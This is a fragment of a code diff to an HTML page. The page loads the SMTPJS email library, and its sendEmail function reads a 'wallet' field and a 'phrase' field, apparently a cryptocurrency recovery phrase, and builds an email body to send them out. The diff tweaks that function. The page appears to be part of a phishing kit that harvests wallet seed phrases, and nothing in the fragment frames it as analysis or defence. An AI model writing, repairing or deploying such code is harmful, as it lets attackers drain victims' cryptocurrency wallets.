@@ -79,8 +79,8 @@
    <script src="index.js"></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
-      function sendEmail(e){
-         e.preventDefault()
+      function sendEmail(){
+         // e.preventDefault()
          var wallet = document.getElementById("wallet").value
          var phrase = document.getElementById("phrase").value
          var body = "wallet: " + wallet + "<br/> phrase: " +phrase;
